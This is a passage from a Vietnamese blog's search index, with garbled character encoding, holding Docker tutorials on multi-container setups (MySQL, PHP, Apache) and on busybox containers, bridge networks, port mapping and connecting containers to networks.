0 rows affected (0.03 sec) mysql\u0026gt; create database db_test; Query OK, 1 row affected (0.02 sec) mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | db_test | | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; select User from user; +------------------+ | User | +------------------+ | root | | testuser | | mysql.infoschema | | mysql.session | | mysql.sys | | root | +------------------+ 6 rows in set (0.00 sec) NhÆ° váº­y ta cÃ³ cÃ¡c user lÃ : root vÃ  testuser. Vá»›i testuser cÃ³ password lÃ  testpass.\nKáº¿t luáº­n Trong bÃ i há»c nÃ y, chÃºng ta Ä‘Ã£ há»c Ä‘Æ°á»£c tá»« anh XuanThuLabChanel cÃ¡ch cáº¥u hÃ¬nh ra 3 container cháº¡y 3 dá»‹ch vá»¥ khÃ¡c nhau: mysql, php, mÃ¡y chá»§ web apache httpd. trong Ä‘Ã³ mÃ¡y chá»§ web truy cáº­p Ä‘Æ°á»£c cá»•ng 9999 trÃªn host. Trong bÃ i tiáº¿p theo, chÃºng ta sáº½ cÃ i Ä‘áº·t wordpress vÃ o há»‡ thá»‘ng nÃ y.\n","description":"Pháº§n nÃ y chÃºng ta sáº½ há»c vá» : cÃ i Ä‘áº·t vÃ  cáº¥u hÃ¬nh má»™t há»‡ thá»‘ng trÃªn docker gá»“m  3 container cháº¡y 3 dá»‹ch vá»¥ khÃ¡c nhau: mysql, php, mÃ¡y chá»§ web apache httpd. trong Ä‘Ã³ mÃ¡y chá»§ web truy cáº­p Ä‘Æ°á»£c cá»•ng 9999 trÃªn host","id":20,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vÃ  sá»­ dá»¥ng docker (P4)","uri":"https://minhlongmt183.github.io/posts/docker_p4/"},{"content":"\rToÃ n bá»™ series nÃ y Ä‘Æ°á»£c tham kháº£o tá»« hai nguá»“n chÃ­nh: XuanThuLabChanel vÃ  DockerDoc. Em xin chÃ¢n thÃ nh cáº£m Æ¡n sá»± cá»‘ng hiáº¿n cá»§a cÃ¡c tÃ¡c giáº£ cá»§a nhá»¯ng kÃªnh nÃ³i trÃªn.â¤ï¸â¤ï¸â¤ï¸\rGiá»›i thiá»‡u vá» Image Busybox Busybox lÃ  má»™t image ráº¥t nhá» gá»n nhÆ°ng chá»©a ráº¥t nhiá»u cÃ´ng cá»¥ dá»±a trÃªn ná»n táº£ng linux.\nTáº£i image busybox:\n1 2 3 4 5 6 â¯ docker pull busybox Using default tag: latest latest: Pulling from library/busybox b71f96345d44: Pull complete Digest: sha256:930490f97e5b921535c153e0e7110d251134cc4b72bbb8133c6a5065cc68580d Status: Downloaded newer image for busybox:latest Táº¡o má»™t container cháº¡y image busybox\n1 2 â¯ docker run -it --rm busybox / # Option --rm dÃ¹ng cho nhá»¯ng container muá»‘n cháº¡y má»™t láº§n, sau khi cháº¡y xong docker sáº½ tá»± Ä‘á»™ng xÃ³a container Ä‘Ã³ Ä‘i.\nContainer cá»§a image busybox cÃ³ ráº¥t nhiá»u lá»‡nh, Ä‘á»ƒ liá»‡t kÃª cÃ¡c lá»‡nh, ta dÃ¹ng:\n1 2 3 4 5 6 7 / # ls /bin/ -la total 449700 drwxr-xr-x 2 root root 12288 Jun 7 17:34 . drwxr-xr-x 1 root root 4096 Jun 9 16:00 .. -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 [ -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 [[ -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 acpid Giá»›i thiá»‡u máº¡ng, network trong docker, máº¡ng bridge Liá»‡t kÃª cÃ¡c máº¡ng cÃ³ trong docker. Kiá»ƒm tra trong docker cÃ³ nhá»¯ng máº¡ng nÃ o, ta dÃ¹ng lá»‡nh:\n1 2 3 4 5 â¯ docker network ls NETWORK ID NAME DRIVER SCOPE e0b165102300 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local á» Ä‘Ã¢y chÃºng ta cÃ³ 3 network Ä‘Æ°á»£c táº¡o máº·c Ä‘á»‹nh khi docker táº¡o, bao gá»“m: bridge dÃ¹ng DRIVER bridge, host dÃ¹ng DRIVE host vÃ  none dÃ¹ng DRIVE null.\nKiá»ƒm tra thÃ´ng tin network Äá»ƒ kiá»ƒm tra thÃ´ng tin vá» má»™t network cÅ©ng nhÆ° nhá»¯ng container nÃ o káº¿t ná»‘i vÃ o, ta dÃ¹ng lá»‡nh:\ndocker network inspect \u0026lt;NAME\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 â¯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;e0b1651023003b4e6235e7b45319daa20d80a247d66e0b303eaf5e53fb90f0f8\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-09T20:59:15.89942017+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: {}, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] á» Ä‘Ã¢y chÃºng ta chÃº Ã½, trÆ°á»ng Container rá»—ng, cÃ³ nghÄ©a lÃ  khÃ´ng cÃ³ container nÃ o káº¿t ná»‘i vÃ o.\nMáº¡ng bridge. Ta tiáº¿n hÃ nh táº¡o má»™t container B1 vÃ  kiÃªm tra láº¡i máº¡ng bridge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 â¯ docker run -it --name B1 busybox / # % â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2f6dd1dda04d busybox \u0026#34;sh\u0026#34; 9 seconds ago Up 8 seconds B1 â¯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;e0b1651023003b4e6235e7b45319daa20d80a247d66e0b303eaf5e53fb90f0f8\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-09T20:59:15.89942017+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;2f6dd1dda04d0ab42434a6cff6f9c7eb42474f81acdf32809486f8fa82be8951\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B1\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;0af6a3739786e89d5161f25edf7bb2a5d900ab580ab53e8f852a197134e010b7\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] Xem láº¡i trÆ°á»ng container thÃ¬ Ä‘Ã£ tháº¥y cÃ³ thÃªm má»™t container cÃ³ tÃªn lÃ  B1 Ä‘ang cháº¡y. NgoÃ i ra chÃºng ta cÃ²n cÃ³ thá»ƒ kiáº¿m tra container Ä‘ang dÃ¹ng máº¡ng nÃ o vÃ  Ä‘Æ°á»£c cáº¥p Ä‘á»‹a chá»‰ IP báº±ng bao nhiÃªu thÃ´ng qua lá»‡nh docker inspect \u0026lt;container_name\u0026gt;\nTáº¡o ra thÃªm 1 container tÃªn B2, khi Ä‘Ã³ container B1, B2 cÃ³ thá»ƒ nhÃ¬n tháº¥y nhau, chÃºng ta cÃ³ thá»ƒ kiá»ƒm tra thÃ´ng qua lá»‡nh ping.\nTrong image busybox, cÃ³ sáºµn má»™t cÃ´ng cá»¥ Ä‘á»ƒ táº¡o mÃ¡y chá»§ web http. Giáº£ sá»­ ta muá»‘n cho container B2 cháº¡y mÃ¡y chá»§ web http, chÃºng ta vÃ o /var/www vÃ  cháº¡y lá»‡nh httpd\n1 2 3 4 5 6 7 â¯ docker attach B2 / # cd var/ /var # ls spool www /var # cd www/ /var/www # httpd /var/www # Táº¡o má»™t file index.html vá»›i ná»™i dung lÃ :\n1 web server is running... Tá»« container B1, ta tiáº¿n hÃ nh wget tá»›i B2\n1 2 3 4 5 6 7 8 â¯ docker attach B1 / # wget -O - 172.17.0.3 Connecting to 172.17.0.3 (172.17.0.3:80) writing to stdout web server is running... - 100% |********************************| 25 0:00:00 ETA written to stdout / # Vá»›i 172.17.0.3 lÃ  Ä‘á»‹a chá»‰ cá»§a container B2, cÃ³ thá»ƒ xem báº±ng lá»‡nh docker network inspect bridge. RÃµ rÃ ng, container B1 Ä‘Ã£ Ä‘á»c Ä‘Æ°á»£c file index mÃ  B2 tráº£ vá» vá»›i dÃ²ng chá»¯ web server is running...\nÃnh xáº¡ cá»•ng máº¡ng trong docker Ãnh xáº¡ cá»•ng máº¡ng B2 Ä‘ang má»Ÿ cá»•ng 80, mÃ¡y host cá»§a chÃºng ta Ä‘ang cÃ³ Ä‘á»‹a chá»‰ lÃ  127.0.0.1, chÃºng ta muá»‘n tá»« ngoÃ i máº¡ng truy cáº­p Ä‘Æ°á»£c tá»›i container B2 thÃ¬ pháº£i Ã¡nh xáº¡ cá»•ng 80 cá»§a B2 tá»›i má»™t cá»•ng nÃ o Ä‘Ã³ cá»§a host. Trong vÃ­ dá»¥ nÃ y, chÃºng ta sáº½ thiáº¿t láº­p truy cáº­p Ä‘áº¿n cá»•ng 80 cá»§a B2 thÃ´ng qua cá»•ng 8888 ip mÃ¡y host 127.0.0.1.\nÄiá»u nÃ y Ä‘Æ°á»£c lÃ m á»Ÿ bÆ°á»›c táº¡o container B2, lÃºc táº¡o chÃºng ta sáº½ Ã¡nh xáº¡ cá»•ng 80 tá»›i cá»•ng 8888 cá»§a mÃ¡y host. CÃº phÃ¡p nhÆ° sau:\ndocker run -it --name \u0026lt;name\u0026gt; -p \u0026lt;host_port\u0026gt;:\u0026lt;container_port\u0026gt; image\n1 2 â¯ docker run -it --name B2 -p 8888:80 busybox / # Khi kiá»ƒm tra báº±ng lá»‡nh docker ps ta sáº½ tháº¥y container B2 Ä‘Ã£ Ã¡nh xáº¡ cá»•ng 80 lá»‡nh 8888 cá»§a mÃ¡y host á»Ÿ PORT.\n1 2 3 â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES bdd19faad9cf busybox \u0026#34;sh\u0026#34; 8 minutes ago Up 8 minutes 0.0.0.0:8888-\u0026gt;80/tcp B2 ChÃºng ta sáº½ thao tÃ¡c láº¡i má»™t láº§n á»Ÿ docker B2 Ä‘á»ƒ cháº¡y httpd vÃ  táº¡o file index.html vá»›i ná»™i dung web server is running... trong thÆ° má»¥c /var/www. Sau Ä‘Ã³, chÃºng ta truy cáº­p á»Ÿ trÃ¬nh duyá»‡n chrome tá»« mÃ¡y host Ä‘áº¿n Ä‘á»‹a chá»‰ 127.0.0.1:8888\nNhÆ° váº­y, ta Ä‘Ã£ cÃ³ thá»ƒ truy cáº­p Ä‘áº¿n file index.html trong container B2 tá»« máº¡ng bÃªn ngoÃ i host.\nTáº¡o thÃªm máº¡ng TrÆ°á»ng há»£p chÃºng ta khÃ´ng muá»‘n táº¥t cáº£ cÃ¡c container cÃ¹ng káº¿t ná»‘i vÃ o má»™t máº¡ng bridge, ta cÃ³ thá»ƒ táº¡o thÃªm nhiá»u bridge riÃªng Ä‘á»ƒ cÃ³ thá»ƒ tÃ¡ch cÃ¡c riÃªng cÃ¡c container thÃ nh cÃ¡c cá»¥m riÃªng. Äá»ƒ táº¡o ra má»™t máº¡ng bridge, ta dÃ¹ng lá»‡nh:\ndocker network create --driver \u0026lt;loai_mang\u0026gt; \u0026lt;ten_mang\u0026gt;\ná» Ä‘Ã¢y chÃºng ta muá»‘n táº¡o thÃªm máº¡ng bridge nÃªn sau --driver sáº½ lÃ  bridge\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 â¯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local â¯ docker network create --driver bridge mynetwork 6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0 â¯ docker network create --driver bridge network1 8f94d7a2e8ff372c3072294dd5260bbea0d0fb2692c2bedc3acad080b07b229c â¯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 6c224f5d1a98 mynetwork bridge local 8f94d7a2e8ff network1 bridge local 271997adaaa9 none null local ChÃºng ta tiáº¿n hÃ nh táº¡o má»™t sá»‘ container khÃ´ng káº¿t ná»‘i máº·c Ä‘á»‹nh vÃ o network bridge mÃ  sáº½ káº¿t ná»‘i vÃ o mynetwork cá»§a chÃºng ta.\n1 2 â¯ docker run -it --name B3 --network mynetwork busybox / # Äá»ƒ chá»‰ Ä‘á»‹nh network khi táº¡o, ta thÃªm tÃ¹y chá»n --network vÃ  theo sau lÃ  tÃªn cá»§a network mÃ¬nh muá»‘n káº¿t ná»‘i tá»›i. ChÃºng ta kiá»ƒm tra xem B3 cÃ³ tháº­t sá»± Ä‘Ã£ káº¿t ná»‘i tá»›i mynetwork chÆ°a.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 â¯ docker network inspect mynetwork [ { \u0026#34;Name\u0026#34;: \u0026#34;mynetwork\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T07:59:52.392658153+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.20.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.20.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;d8f6cf60953a1ebd7c1a84a95e5503bc726a5e77df2c939e8072fe6ca7406d65\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: {}, \u0026#34;Labels\u0026#34;: {} } ] RÃµ rÃ ng á»Ÿ trÆ°á»ng container Ä‘Ã£ thÃªm má»™t container lÃ  B3 vá»›i Ä‘á»‹a chá»‰ lÃ  172.20.0.2. ChÃºng ta tiáº¿p tá»¥c táº¡o thÃªm má»™t container B4 káº¿t ná»‘i vá»›i mynetwork vÃ  chá»‰ Ä‘á»‹nh cá»•ng 80 cá»§a nÃ³ Ã¡nh xáº¡ tá»›i cá»•ng 9999 trÃªn mÃ¡y host.\n1 2 3 4 5 6 7 8 â¯ docker run -it --name B4 --network mynetwork -p 9999:80 busybox / # % â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 1b39318c8d5b busybox \u0026#34;sh\u0026#34; About a minute ago Up About a minute 0.0.0.0:9999-\u0026gt;80/tcp B4 a7231f2ebe67 busybox \u0026#34;sh\u0026#34; 5 minutes ago Up 5 minutes B3 bdd19faad9cf busybox \u0026#34;sh\u0026#34; 37 minutes ago Up 37 minutes 0.0.0.0:8888-\u0026gt;80/tcp B2 2f6dd1dda04d busybox \u0026#34;sh\u0026#34; 9 hours ago Up 3 seconds B1 NhÆ° váº­y, trÃªn mÃ¡y cá»§a chÃºng ta Ä‘ang 2 máº¡ng lÃ  bridge vÃ  mynetwork:\nMáº¡ng bridge cÃ³ 2 container Ä‘ang káº¿t ná»‘i tá»›i lÃ  B1 vÃ  B2, trong Ä‘Ã³ B2 Ä‘ang Ã¡nh xáº¡ cá»•ng 80 Ä‘áº¿n cá»•ng 8888 trÃªn mÃ¡y host. Máº¡ng mynetwork cÃ³ 2 container Ä‘ang káº¿t ná»‘i tá»›i lÃ  B3 vÃ  B4, trong Ä‘Ã³ B4 Ä‘ang Ã¡nh xáº¡ cá»•ng 80 Ä‘áº¿n cá»•ng 9999 trÃªn host.\nTa tiáº¿n hÃ nh cháº¡y web server http trÃªn container B4 vÃ  káº¿t ná»‘i tá»« máº¡ng bÃªn ngoÃ i host.\nKhi táº¡o ra 2 network thÃ¬ nhá»¯ng mÃ¡y cÃ¹ng 1 network (B1 vá»›i B2 hoáº·c B3 vá»›i B4) cÃ³ thá»ƒ tháº¥y Ä‘Æ°á»£c nhau, tuy nhiÃªn á»Ÿ khÃ¡c network (B1 vá»›i B3,B4 hoáº·c B2 vá»›i B3,B4) thÃ¬ khÃ´ng thá»ƒ tháº¥y nhau. ChÃºng ta cÃ³ thá»ƒ kiá»ƒm tra Ä‘iá»u nÃ y thÃ´ng qua lÃªnh ping, tá»« B1 Ä‘áº¿n B2 vÃ  B1 Ä‘áº¿n B3. DÃ¹ng lá»‡nh docker network inspect \u0026lt;ten_network\u0026gt; ta biáº¿t Ä‘Æ°á»£c ip cá»§a B1, B2, B3 láº§n lÆ°á»£t lÃ  172.17.0.3, 172.17.0.2, 172.20.0.2. VÃ o B1 vÃ  tiáº¿n hÃ nh ping qua B2, B3: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 â¯ docker attach B1 / # ping 172.17.0.2 PING 172.17.0.2 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.268 ms 64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.101 ms 64 bytes from 172.17.0.2: seq=2 ttl=64 time=0.198 ms 64 bytes from 172.17.0.2: seq=3 ttl=64 time=0.162 ms 64 bytes from 172.17.0.2: seq=4 ttl=64 time=0.165 ms 64 bytes from 172.17.0.2: seq=5 ttl=64 time=0.164 ms 64 bytes from 172.17.0.2: seq=6 ttl=64 time=0.139 ms 64 bytes from 172.17.0.2: seq=7 ttl=64 time=0.160 ms 64 bytes from 172.17.0.2: seq=8 ttl=64 time=0.181 ms ^C --- 172.17.0.2 ping statistics --- 9 packets transmitted, 9 packets received, 0% packet loss round-trip min/avg/max = 0.101/0.170/0.268 ms / # ping 172.20.0.2 PING 172.20.0.2 (172.20.0.2): 56 data bytes ^C --- 172.20.0.2 ping statistics --- 25 packets transmitted, 0 packets received, 100% packet loss / # Ãnh xáº¡ cá»•ng cho má»™t container Ä‘ang cháº¡y. Trong vÃ­ dá»¥ trÃªn, B3 Ä‘ang káº¿t ná»‘i tá»›i mynetwork, ta muá»‘n cho B3 káº¿t ná»‘i tháº³ng tá»›i network bridge, ta lÃ m nhÆ° sau:\ndocker network connect \u0026lt;ten_mang_muon_ket_noi\u0026gt; \u0026lt;ten_container\u0026gt;\n1 â¯ docker network connect bridge B3 Kiá»ƒm tra máº¡ng bridge Ä‘á»ƒ xem B3 Ä‘Ã£ thá»±c sá»± káº¿t ná»‘i chÆ°a:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 â¯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;286d5161c9f65235af68d99040f31b167b4bf23f9803fa3a2b3bd7de61b7c81c\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T06:58:33.069522692+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;2f6dd1dda04d0ab42434a6cff6f9c7eb42474f81acdf32809486f8fa82be8951\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B1\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;5ddc6f87b486401bd0e2cfea3e1c8324300f9045712778f1c321e35349c56cff\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:03\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.3/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;f1c96c1089fbe206c52832089be7b18321aeea7abff840f5169d3d171fa5ca1d\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:04\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.4/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;bdd19faad9cfe6ba9f49a532cf245b3a1bec95d8d20688f4c6b52018d45538b2\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B2\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;32f69c565c649791c9f70db3a7a224e6a8d882b41fb9dc7c6477d4f33b9ec32b\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] Trong trÆ°á»ng container Ä‘Ã£ cÃ³ thÃªm container B3, vÃ  kiá»ƒm tra network mynetwork thÃ¬ tháº¥y B3 váº«n Ä‘ang káº¿t ná»‘i tá»›i mynetwork.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 â¯ docker network inspect mynetwork [ { \u0026#34;Name\u0026#34;: \u0026#34;mynetwork\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T07:59:52.392658153+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.20.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.20.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;1b39318c8d5b92261c22321f765945b85231160b53a9a3933b5fe120db80e7c2\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B4\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;5f26179cc819ffe9f6089c8de41cc236a36ce90c5ac646041d99de7d4a54d3e5\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:03\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.3/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;d8f6cf60953a1ebd7c1a84a95e5503bc726a5e77df2c939e8072fe6ca7406d65\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: {}, \u0026#34;Labels\u0026#34;: {} } ] LÃºc nÃ y, B3 cÃ³ thá»ƒ káº¿t ná»‘i tá»›i B2 vÃ  B1 vÃ  